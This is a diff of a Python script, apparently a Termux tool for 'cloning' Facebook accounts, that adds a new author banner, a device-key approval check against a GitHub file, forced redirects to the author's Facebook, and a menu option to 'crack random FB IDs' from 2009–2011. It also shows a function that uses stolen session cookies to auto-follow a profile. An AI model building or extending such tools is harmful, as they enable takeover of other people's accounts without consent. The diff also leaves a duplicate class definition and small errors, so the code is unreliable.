@@ -387,28 +387,135 @@ def follow(ses,coki):
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
-logo = ("""\033[1;32m
-       
-┌───────────────────────────────────────────────────────────┐
-│                                                           │
-│   █████╗ ██╗      █████╗ ███╗   ███╗ ██████╗ ██╗██████╗   │
-│  ██╔══██╗██║     ██╔══██╗████╗ ████║██╔════╝ ██║██╔══██╗  │
-│  ███████║██║     ███████║██╔████╔██║██║  ███╗██║██████╔╝  │
-│  ██╔══██║██║     ██╔══██║██║╚██╔╝██║██║   ██║██║██╔══██╗  │
-│  ██║  ██║███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║██║  ██║  │
-│  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═╝  │
-│                                            │
-└───────────────────────────────────────────────────────────┘  \033
-__________________×______________________
-  
-  Auther   :  MD ALAMGIR HOSEN
+def logo2():
+	#Yahan apna logo paste krna hw
+	print ("""
+  ▄▄▄       
+ ▄▄▄       ██▓    ▄▄▄       ███▄ ▄███▓
+▒████▄    ▓██▒   ▒████▄    ▓██▒▀█▀ ██▒
+▒██  ▀█▄  ▒██░   ▒██  ▀█▄  ▓██    ▓██░
+░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██ ▒██    ▒██ 
+ ▓█   ▓██▒░██████▒▓█   ▓██▒▒██▒   ░██▒
+ ▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ░  ░
+  ▒   ▒▒ ░░ ░ ▒  ░ ▒   ▒▒ ░░  ░      ░
+  ░   ▒     ░ ░    ░   ▒   ░      ░   
+      ░  ░    ░  ░     ░  ░       ░   
+                                      
+      
+ ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m MD. ALAMGIR\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Contact :+8801712034653\x1b[0m\x1b[1;97m] \033[1;37m 
+ ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : MD. ALAMGIR \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/cyberattack07 \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/Tera.Papa.Alamgir.441 \x1b[0m\x1b[1;97m]
+───────────────────────────────────────────────────────× 
+ """)
  
-  Github   :  THE DARK WORLD TEAM-CYBER ARMY&RECOVERY ZONE 
-  Facebook : https://www.facebook.com/TeraPaPa.ALAMgir.HoSeN ⭐⭐⭐⭐
-  
-  Contact : Whatsapp+8801712034653 
-__________________×______________________\033[1;37m""")
-
+def runtxt(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+ 
+os.system('termux-setup-storage')
+ 
+def helpnote():
+	print("%s [=>] FOLLOW ME ON  FB TU KNOW ABOUT UPDATES  :)"%(G))
+	subprocess.check_output(["am", "start", "https://github.com/cyberattack07/approval.txt/blob/main/approval.txt"])
+	exit(" [=>] FACEBOOK :  https://www.facebook.com/Tera.Papa.Alamgir.441")
+ 
+ 
+def notice():
+ 
+ 
+ 
+	runtxt("\n\033[0;97m  Free 2009 cloning Tool For Free Aproval Join Group ")
+	os.system("xdg-open https://m.me/Tera.Papa.Alamgir.441/?app=fbl")
+	runtxt("\033[0;97m Key Approval ke Lai Group Jion Krein >> %s%s"%(G,basesplit))
+	runtxt("\033[0;97m Key group admin ke post pe coment krein")
+	os.system("xdg-open https://m.me/Tera.Papa.Alamgir.441/?app=fbl")
+	subprocess.check_output(["am", "start", "https://m.me/Tera.Papa.Alamgir.441/?app=fbl"])
+	
+ 
+ 
+        
+plist = (platform.uname())[2]
+basex = plist
+basex1 = basex.encode('ascii')
+basex2 = base64.b64encode(basex1)
+basex3 = basex2.decode('ascii')
+base4 = (basex3).upper()
+basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
+ 
+ 
+class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		try:
+			plr = requests.get('https://github.com/cyberattack07/approval.txt/blob/main/approval.txt').text
+			if basesplit in plr:
+				key = basesplit
+				stat = ("\033[0;97mPREMIUM")
+				FY = '\033[0;97m'
+				FG = '\033[0;97m'
+				GET = '\r'
+			else:
+				key = ("\033[0;97m -")
+				stat = ("\033[0;97PREMIUM")
+				FY = '\033[0;90m'
+				FG = '\033[0;90m'
+				GET = '\033[0;97m [P] GET PREMIUM'
+		except requests.exceptions.ConnectionError:
+			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
+			exit()
+		os.system("clear")
+		#yahan logo lagana apna
+		print ("""
+   
+ ▄▄▄       ██▓    ▄▄▄       ███▄ ▄███▓
+▒████▄    ▓██▒   ▒████▄    ▓██▒▀█▀ ██▒
+▒██  ▀█▄  ▒██░   ▒██  ▀█▄  ▓██    ▓██░
+░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██ ▒██    ▒██ 
+ ▓█   ▓██▒░██████▒▓█   ▓██▒▒██▒   ░██▒
+ ▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ░  ░
+  ▒   ▒▒ ░░ ░ ▒  ░ ▒   ▒▒ ░░  ░      ░
+  ░   ▒     ░ ░    ░   ▒   ░      ░   
+      ░  ░    ░  ░     ░  ░       ░   
+                                      
+ ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m MD. ALAMGIR\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Contact : +8801712034653\x1b[0m\x1b[1;97m] \033[1;37m 
+ ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : MD. ALAMGIR \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/cyberattack07 \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/Tera.Papa.Alamgir.441\x1b[0m\x1b[1;97m]
+───────────────────────────────────────────────────────× 
+    """)
+		print("%s [%s•%s] %sTOOL NAME : %s2009 Cloning Tool"%(G,R,G,B,G))
+		print("%s [%s•%s] %sContack   : %s+8801712034653"%(G,R,G,B,G))
+		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
+		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
+		print("───────────────────────────────────────────────────────× ")
+		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW MY FACEBOOK ACCOUNT FIRST\x1b[0m\x1b[1;97m] \033[1;37m ")
+		subprocess.check_output(["am", "start", "https://www.facebook.com/Tera.Papa.Alamgir.441"])
+		print("───────────────────────────────────────────────────────× ")
+		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(PREMIUM)"%(G,R,G,Y,B))
+		tanya = input("    \033[0;97m(=×>)\033[0;97m CHOOSE : ")
+		print("───────────────────────────────────────────────────────× ")
+		if tanya in ["", " "]:
+			Main()
+		elif tanya in ["1", "01"]:
+			if basesplit in plr:
+			        self.fbtua()
+			else: 
+				notice()
+				exit()
+		else:
+			Main()
 class Main:
 	def __init__(self):
 		self.id = []
